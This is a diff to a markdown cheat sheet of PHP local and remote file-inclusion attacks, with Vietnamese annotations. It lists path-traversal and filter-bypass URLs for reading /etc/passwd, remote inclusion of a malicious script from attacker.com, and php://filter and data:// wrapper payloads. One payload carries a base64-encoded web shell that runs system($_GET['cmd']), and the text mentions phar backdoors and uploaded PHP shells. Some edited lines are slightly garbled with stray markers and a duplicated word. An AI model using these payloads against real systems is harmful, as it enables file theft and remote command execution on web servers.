@@ -33,14 +33,14 @@ include($file);
    * Path and dot truncation
    * On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.
 ```
-http://example.com/index.php?page=../../../etc/passwd............[ADD MORE](*)
+http://example.com/index.php?page=../../../etc/passwd............[ADD MORE](* Server)
 http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
 http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
 http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
   * Filter bypass tricks
 ```
-http://example.com/index.php?page=....//....//etc/passwd(*)
+http://example.com/index.php?page=....//....//etc/passwd(*server)
 http://example.com/index.php?page=..///////..////..//////etc/passwd(*)
 http://example.com/index.php?page=../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd(*)
 ```
@@ -51,7 +51,9 @@ http://example.com/index.php?page=http://atacker.com/mal.php
 http://example.com/index.php?page=\\attacker.com\shared\mal.php
 ```
 ## Payloads
-- LFI / RFI using PHP wrappers & protocols
+- LFI / RFI using PHP wrappers & protocols.
+
+Wrapper protocol in PHP is a mechanism that allows you to access different resources through different protocols like http, ftp, php, file etc., information through functions like fopen, file_get_contents and include. include. This makes it possible for PHP to handle resource types that are not just file systems but also data from URLs, remote connections, and other stream data.
 - php://filter
   * PHP filters allow perform basic modification operations on the data before being it's read or written. There are 5 categories of filters:
 
@@ -109,9 +111,9 @@ echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=da
 ```
 echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");
 ```
-## data://(chưa test)
+## data://
 ```
-http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?> open_basedir trong file cấu hình php.ini phải đươc bật
 http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
@@ -137,7 +139,7 @@ Create a phar archive containing a backdoor file: php --define phar.readonly=0 a
   $phar->stopBuffering();
 ?>
 ```
-- Upload a Zip or Rar file with a PHPShell inside and access it.
+- Upload a Zip or Rar file with a PHPShell inside and access it.(*)
 In order to be able to abuse the rar protocol it need to be specifically activated.
 
 ```
